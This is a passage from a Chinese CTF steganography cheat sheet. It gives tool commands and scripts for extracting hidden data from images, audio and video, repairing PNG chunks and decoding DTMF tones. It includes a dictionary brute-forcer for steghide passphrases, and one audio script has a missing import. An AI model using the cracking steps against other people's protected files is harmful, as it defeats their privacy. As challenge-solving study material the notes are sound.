它可在Linux，Windows，Mac Os X，iOS，Android OS和许多其他操作系统上运行。</p><h4 id="identify"><a href="#identify" class="headerlink" title="identify"></a>identify</h4><h5 id="提取每一帧的间隔"><a href="#提取每一帧的间隔" class="headerlink" title="提取每一帧的间隔"></a>提取每一帧的间隔</h5><p>间隔时间转成0或者1，拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identify -format &quot;%T\n&quot; *.gif&gt;1.txt</span><br></pre></td></tr></table></figure><h5 id="查看图片详情"><a href="#查看图片详情" class="headerlink" title="查看图片详情"></a>查看图片详情</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identify example.png</span><br></pre></td></tr></table></figure><p>从指定文件中获取缩略图：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg$ exiftool -b -ThumbnailImage &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;hekkerman.jpg&gt; thumbnail.jpg </span><br></pre></td></tr></table></figure><h3 id="steghide"><a href="#steghide" class="headerlink" title="steghide"></a>steghide</h3><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>多用于jpg文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide.exe extract -sf flag.jpg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf 1.jpg -p 123456</span><br></pre></td></tr></table></figure><h4 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python steg_brute.py -b -d [字典] -f [jpg_file]</span><br></pre></td></tr></table></figure><p>或者–kali有文件夹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    stegoFile=<span class="string">&#x27;thing.jpg&#x27;</span></span><br><span class="line">    extractFile=<span class="string">&#x27;hide.txt&#x27;</span></span><br><span class="line">    passFile=<span class="string">&#x27;english.dic&#x27;</span></span><br><span class="line"></span><br><span class="line">    errors=[<span class="string">&#x27;could not extract&#x27;</span>,<span class="string">&#x27;steghide --help&#x27;</span>,<span class="string">&#x27;Syntax error&#x27;</span>]</span><br><span class="line">    cmdFormat=<span class="string">&#x27;steghide extract -sf &quot;%s&quot; -xf &quot;%s&quot; -p &quot;%s&quot;&#x27;</span></span><br><span class="line">    f=open(passFile,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        cmd=cmdFormat %(stegoFile,extractFile,line.strip())</span><br><span class="line">        p=Popen(cmd,shell=<span class="literal">True</span>,stdout=PIPE,stderr=STDOUT)</span><br><span class="line">        content=unicode(p.stdout.read(),<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> err <span class="keyword">in</span> errors:</span><br><span class="line">            <span class="keyword">if</span> err <span class="keyword">in</span> content:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> content,</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&#x27;the passphrase is %s&#x27;</span> %(line.strip())</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="stegcracker"><a href="#stegcracker" class="headerlink" title="stegcracker"></a>stegcracker</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面$ &#x2F;home&#x2F;steady&#x2F;.local&#x2F;bin&#x2F;stegcracker</span><br></pre></td></tr></table></figure><p>有时候也可以破解音频。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ steghide extract -sf out.wav</span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to &quot;download.txt&quot;.</span><br></pre></td></tr></table></figure><h3 id="stepic"><a href="#stepic" class="headerlink" title="stepic"></a>stepic</h3><p>提取数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ stepic --decode --image-in&#x3D;&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1.png --out&#x3D;output.txt</span><br></pre></td></tr></table></figure><p>转jpg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ stepic -i &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;png&#x2F;00001069.png -d &gt; thing</span><br></pre></td></tr></table></figure><h3 id="stegoveritas"><a href="#stegoveritas" class="headerlink" title="stegoveritas"></a>stegoveritas</h3><p>一键查看文件信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;steady&#x2F;.local&#x2F;bin&#x2F;stegoveritas flag.jpg</span><br></pre></td></tr></table></figure><h3 id="extundelete"><a href="#extundelete" class="headerlink" title="extundelete"></a>extundelete</h3><p>恢复文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extundelete --restore-all corrupt-file.img</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">恢复&#x2F;dev&#x2F;sda5中所有数据</span><br><span class="line">xtundelete &#x2F;dev&#x2F;sda5 --restore-all </span><br></pre></td></tr></table></figure><h3 id="两张相似的图片"><a href="#两张相似的图片" class="headerlink" title="两张相似的图片"></a>两张相似的图片</h3><p>Beyond Compare 4工具</p><p>stegsolve异或</p><p>盲水印</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali compare 1.jpg 2.jpg out.jpg</span><br></pre></td></tr></table></figure><h3 id="chunk块中藏有信息"><a href="#chunk块中藏有信息" class="headerlink" title="chunk块中藏有信息"></a>chunk块中藏有信息</h3><p>CRC块中有可打印字符，正常的CRC应该是六个字节，三个十六进制数。比如，C4ED3H。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/57.png" alt="57"></p><h3 id="IDAT标识缺少"><a href="#IDAT标识缺少" class="headerlink" title="IDAT标识缺少"></a>IDAT标识缺少</h3><p>如果png图片模糊，可能缺少<code>IDAT</code>标识，放入01也会提示，<code>*ERROR: CRC Mismatch @ chunk[2]; in data: f4ff7854; expected: 0761f34a</code>。</p><p>01提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*ERROR: CRC Mismatch @ chunk[2]; in data: f4ff7854; expected: 0761f34a</span><br><span class="line">*ERROR: CRC Mismatch @ chunk[3]; in data: 80a3b703; expected: a4d05483</span><br><span class="line">*ERROR: CRC Mismatch @ chunk[29]; in data: 00000000; expected: 5808f045</span><br></pre></td></tr></table></figure><p>在工作区查看遍历。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/55.png" alt="55"></p><p><code>IDAT</code>十六进制标识为：<code>49 44 41 54</code>，将两个chunk的IDAT在<code>union CTYPE type</code>的位置补上即可得到完整的图片。</p><p>直接找到对应位置修改。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/56.png" alt="56"></p><h3 id="IDAT信息隐藏"><a href="#IDAT信息隐藏" class="headerlink" title="IDAT信息隐藏"></a>IDAT信息隐藏</h3><p>IDAT：存储实际的数据，在数据流中可包含多个连续顺序的图像数据块，储存图像像数数据。在数据流中可包含多个连续顺序的图像数据块。采用 LZ77 算法的派生算法进行压缩。可以用 zlib 解压缩。IDAT块只有当上一个块充满时，才会继续下 一个新块。</p><p>首先查看png的idat信息，是否有前一块没有满，后一块有数据的情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pngcheck.exe -v sctf.png</span><br></pre></td></tr></table></figure><p>我们可以看到最后一个数据块出问题了，根据PNG结构，我们直接搜索ascii码-IDAT，因为是最后一个数据块，所以直接，搜索最后一个idat或者直接搜索<code>49444154</code>。接下来就需要分析该数据块的结构，首先<code>49444154</code>是<code>Chunk Type Code（数据块类型码）</code>，他的前面是<code>Length（长度）</code>，这里是<code>0000008A</code>，转换成十进制，就是138也就是说，<code>Chunk Data（数据块数据）</code>的长度是138，最后四个字节就是<code>CRC</code>。如图：</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/23.png" alt="23"></p><p>去出数据块数据，zlib解压，二进制转字符串。</p><h3 id="图片拼接"><a href="#图片拼接" class="headerlink" title="图片拼接"></a>图片拼接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">montage *jpg -tile <span class="number">10</span>x12 -geometry <span class="number">200</span>x100+<span class="number">0</span>+<span class="number">0</span> out.jpg <span class="comment">#把图片碎片合成一个图片</span></span><br><span class="line"><span class="comment"># 将目录中的jpg文件按顺序拼成x轴10块，y轴12块，每个图块大小为200x100像素，输出文件为out.jpg</span></span><br><span class="line"></span><br><span class="line">gaps --image=out.jpg --generations=<span class="number">50</span> --population=<span class="number">120</span> --size=<span class="number">100</span> <span class="comment">#还原原图片</span></span><br><span class="line">--image           指向拼图的路径</span><br><span class="line">--size            拼图块的像素尺寸</span><br><span class="line">--generations     遗传算法的代的数量</span><br><span class="line">--population      个体数量</span><br><span class="line">--verbose         每一代训练结束后展示最佳结果</span><br><span class="line">--save            将拼图还原为图像</span><br></pre></td></tr></table></figure><h3 id="Honeyview"><a href="#Honeyview" class="headerlink" title="Honeyview"></a>Honeyview</h3><p>可以打开bgp文件。</p><h3 id="db文件"><a href="#db文件" class="headerlink" title="db文件"></a>db文件</h3><p>如果文件中有.db文件，尝试thumbs文件，db文件在win下不可见，直接再压缩包中拖入工具。</p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>二维码颜色反转，使用<code>stegsolve.jar</code>，进行颜色反转。</p><p>有时候两张图片使用stegsove得到一个不清晰二维码，可以继续使用stegsolve修复二维码。</p><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><h3 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h3><h4 id="莫斯电码"><a href="#莫斯电码" class="headerlink" title="莫斯电码"></a>莫斯电码</h4><p>常用工具<code>Audacity </code>。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/13.png" alt="13"></p><p>把上面的点作为 1，下面的点作为 0</p><p><code>0110011001101100011000010110011101111011011001100110010100111000011001100110010000110100001101100011100000110010001100000011010100110001001100110110001000110101001101000110001101100100011001000011010100111001011000100011000000110100001110000011010100110111001100010011100101100110001110010011010001111101</code></p><p>使用python脚本分析频谱图，对高低振幅转换为<code>01</code>，高振幅为<code>1</code>，低振幅为<code>0</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_records</span>(<span class="params">records, format, f</span>):</span></span><br><span class="line">    <span class="comment">#Write a sequence of tuples to a binary file of structures.</span></span><br><span class="line">    record_struct = Struct(format)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> records:</span><br><span class="line">        f.write(record_struct.pack(*r))</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;./music.wav&quot;</span></span><br><span class="line">f = wave.open(path, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"><span class="comment"># 读取格式信息</span></span><br><span class="line"><span class="comment"># (nchannels, sampwidth, framerate, nframes, comptype, compname)</span></span><br><span class="line">params = f.getparams()</span><br><span class="line">nchannels, sampwidth, framerate, nframes = params[:<span class="number">4</span>]</span><br><span class="line"><span class="comment"># 读取波形数据</span></span><br><span class="line">str_data = f.readframes(nframes)</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment">#将波形数据转换为数组</span></span><br><span class="line">wave_data = np.fromstring(str_data, dtype=np.short)</span><br><span class="line">b = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># arr = [elem for elem in wave_data if elem &gt;0]</span></span><br><span class="line">max = <span class="number">0</span></span><br><span class="line">d = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> wave_data:</span><br><span class="line">    <span class="keyword">if</span> i &lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> max !=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> max&lt;<span class="number">25000</span>:</span><br><span class="line">                d +=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        max = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> max &lt; i:</span><br><span class="line">        max = i</span><br><span class="line"></span><br><span class="line">print(d)</span><br><span class="line">print(<span class="string">&quot;\n\n\n\n&quot;</span>)</span><br><span class="line">a = re.findall(<span class="string">r&#x27;.&#123;8&#125;&#x27;</span>,d)</span><br><span class="line">hex_list=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    res = hex(int(i,<span class="number">2</span>))</span><br><span class="line">    hex_list.append(res)</span><br><span class="line">print(hex_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;result.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> hex_list:</span><br><span class="line">        s = struct.pack(<span class="string">&#x27;B&#x27;</span>,int(x,<span class="number">16</span>))</span><br><span class="line">        f.write(s)</span><br></pre></td></tr></table></figure><h4 id="频谱图"><a href="#频谱图" class="headerlink" title="频谱图"></a>频谱图</h4><p>直接右键查看频谱图。有时候切换频谱图看不到内容，这里可以修改频率。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/25.png" alt="25"></p><h4 id="听电话号码"><a href="#听电话号码" class="headerlink" title="听电话号码"></a>听电话号码</h4><h3 id="sox"><a href="#sox" class="headerlink" title="sox"></a>sox</h3><p>变慢音频</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sox slowed.wav fast.wav speed 3.2</span><br></pre></td></tr></table></figure><p>直接查看频谱图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sox slowed.wav -n spectrogram</span><br></pre></td></tr></table></figure><p>修改频谱图使其更清楚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sox slowed.wav -n spectrogram -z 30 -Z -20 -x 1600</span><br></pre></td></tr></table></figure><p>查看音频元数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ sox --i &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;music.wav</span><br><span class="line"></span><br><span class="line">Input File     : &#39;&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;music.wav&#39;</span><br><span class="line">Channels       : 1</span><br><span class="line">Sample Rate    : 8000</span><br><span class="line">Precision      : 16-bit</span><br><span class="line">Duration       : 00:00:20.08 &#x3D; 160640 samples ~ 1506 CDDA sectors</span><br><span class="line">File Size      : 321k</span><br><span class="line">Bit Rate       : 128k</span><br><span class="line">Sample Encoding: 16-bit Signed Integer PCM</span><br></pre></td></tr></table></figure><p>只获取该选项对应的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ soxi -ss &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;music.wav</span><br><span class="line">160640</span><br><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ </span><br><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ soxi -B &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;music.wav</span><br><span class="line">128k</span><br></pre></td></tr></table></figure><h3 id="mediainfo"><a href="#mediainfo" class="headerlink" title="mediainfo"></a>mediainfo</h3><p>查看音频元数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ mediainfo &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;fast.wav</span><br><span class="line">General                                                                                                                                                                           </span><br><span class="line">Complete name                            : &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;fast.wav                                                                                                      </span><br><span class="line">Format                                   : Wave                                                                                                                                   </span><br><span class="line">File size                                : 5.13 MiB</span><br><span class="line">Duration                                 : 56 s 62 ms</span><br><span class="line">Overall bit rate mode                    : Constant</span><br><span class="line">Overall bit rate                         : 768 kb&#x2F;s</span><br><span class="line"></span><br><span class="line">Audio</span><br><span class="line">Format                                   : PCM</span><br><span class="line">Format settings                          : Little &#x2F; Signed</span><br><span class="line">Codec ID                                 : 1</span><br><span class="line">Duration                                 : 56 s 62 ms</span><br><span class="line">Bit rate mode                            : Constant</span><br><span class="line">Bit rate                                 : 768 kb&#x2F;s</span><br><span class="line">Channel(s)                               : 1 channel</span><br><span class="line">Sampling rate                            : 48.0 kHz</span><br><span class="line">Bit depth                                : 16 bits</span><br><span class="line">Stream size                              : 5.13 MiB (100%)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="silienteye"><a href="#silienteye" class="headerlink" title="silienteye"></a>silienteye</h3><p>使用sileneye工具打开，即可得到flag。</p><h3 id="MP3Stego"><a href="#MP3Stego" class="headerlink" title="MP3Stego"></a>MP3Stego</h3><p>密码可能藏在字符串中。</p><p>使用strings</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings mp3 | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode.exe -X -P 密码 flag.mp3#解密之后在文件下可能会出现txt文件。</span><br></pre></td></tr></table></figure><h3 id="ffmpeg"><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h3><p>视频分帧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i flag.mp4 -f image2 image%d.jpg,将视频分离并且重命名为image1,2,3…jpg的图片文件</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i flag.mp4 -r 60 -f image2 image%d.jpg,将视频分离并且重命名为image1,2,3…jpg的图片文件</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i ogreman -map 0:s:0 ogreman-subs.srt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;font size&quot; ogreman-subs.srt | cut -d&quot;&gt;&quot; -f2</span><br></pre></td></tr></table></figure><p>也可以分离gif</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i flag.gif frame_%05d.png</span><br></pre></td></tr></table></figure><h3 id="使用MP3脚本"><a href="#使用MP3脚本" class="headerlink" title="使用MP3脚本"></a>使用MP3脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">F:\CTF-tools\音频隐写\mp3&gt;python3 F:\CTF-tools\音频隐写\mp3\mp3.py F:\CTF-tools\音频隐写\mp3\我很抱歉.mp3</span><br><span class="line">HDCTF&#123;she_nerver_be_with_me&#125;</span><br></pre></td></tr></table></figure><h3 id="dtmf2num"><a href="#dtmf2num" class="headerlink" title="dtmf2num"></a>dtmf2num</h3><p><strong><a href="https://zh.wikipedia.org/wiki/%E5%8F%8C%E9%9F%B3%E5%A4%9A%E9%A2%91">双音多频信号</a>（Dual-Tone Multi-Frequency, DTMF）</strong>，电话系统中电话机与交换机之间的一种用户信令，最常用于发拨号时送被叫号码。使用工具拿到音频中的电话号码。</p><p>通过拨号音的信号频率判断内容。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/37.png" alt="37"></p><h4 id="kali-dtmf2num"><a href="#kali-dtmf2num" class="headerlink" title="kali dtmf2num"></a>kali dtmf2num</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/tools/debian$ dtmf2num /home/steady/桌面/steady/密码.wav</span><br><span class="line"></span><br><span class="line">DTMF2NUM <span class="number">0.1</span><span class="number">.1</span></span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open /home/steady/桌面/steady/密码.wav</span><br><span class="line">  wave size      <span class="number">2633728</span></span><br><span class="line">  format tag     <span class="number">1</span></span><br><span class="line">  channels:      <span class="number">2</span></span><br><span class="line">  samples/sec:   <span class="number">48000</span></span><br><span class="line">  avg/bytes/sec: <span class="number">192000</span></span><br><span class="line">  block align:   <span class="number">4</span></span><br><span class="line">  bits:          <span class="number">16</span></span><br><span class="line">  samples:       <span class="number">1316864</span></span><br><span class="line">  bias adjust:   <span class="number">2</span></span><br><span class="line">  volume peaks:  <span class="number">-388</span> <span class="number">388</span></span><br><span class="line">  normalize:     <span class="number">32379</span></span><br><span class="line">  resampling to: <span class="number">8000</span>hz</span><br><span class="line"></span><br><span class="line">- MF numbers:    <span class="number">44</span></span><br><span class="line"></span><br><span class="line">- DTMF numbers:  <span class="number">18688422216</span>D09<span class="comment">#重要信息。</span></span><br></pre></td></tr></table></figure><h4 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h4><p><code>http://dialabc.com/sound/detect/index.html</code>。</p><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>也可以使用脚本，修改文件路径直接就可以拿到拨号号码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># load wav file。</span></span><br><span class="line">    <span class="comment">#这里注意修改文件。</span></span><br><span class="line">    wav = wave.open(<span class="string">&#x27;./1.wav&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure><p>解码出来的数字可能会有杂音，我们需要根据实际情况去重复。</p><h3 id="multimon-ng"><a href="#multimon-ng" class="headerlink" title="multimon-ng"></a>multimon-ng</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@root:~<span class="comment"># multimon-ng -t wav -a dtmf &#x27;/tmp/1.wav&#x27; </span></span><br><span class="line">multimon-ng <span class="number">1.1</span><span class="number">.7</span></span><br><span class="line">  (C) <span class="number">1996</span>/<span class="number">1997</span> by Tom Sailer HB9JNX/AE4WA</span><br><span class="line">  (C) <span class="number">2012</span><span class="number">-2019</span> by Elias Oenal</span><br><span class="line">Available demodulators: POCSAG512 POCSAG1200 POCSAG2400 FLEX EAS UFSK1200 CLIPFSK FMSFSK AFSK1200 AFSK2400 AFSK2400_2 AFSK2400_3 HAPN4800 FSK9600 DTMF ZVEI1 ZVEI2 ZVEI3 DZVEI PZVEI EEA EIA CCIR MORSE_CW DUMPCSV X10 SCOPE</span><br><span class="line">Enabled demodulators: DTMF</span><br><span class="line">DTMF: <span class="number">1</span></span><br><span class="line">DTMF: <span class="number">1</span></span><br><span class="line">DTMF: <span class="number">8</span></span><br><span class="line">DTMF: <span class="number">6</span></span><br><span class="line">DTMF: <span class="number">8</span></span><br><span class="line">DTMF: <span class="number">4</span></span><br><span class="line">DTMF: <span class="number">2</span></span><br><span class="line">DTMF: <span class="number">2</span></span><br><span 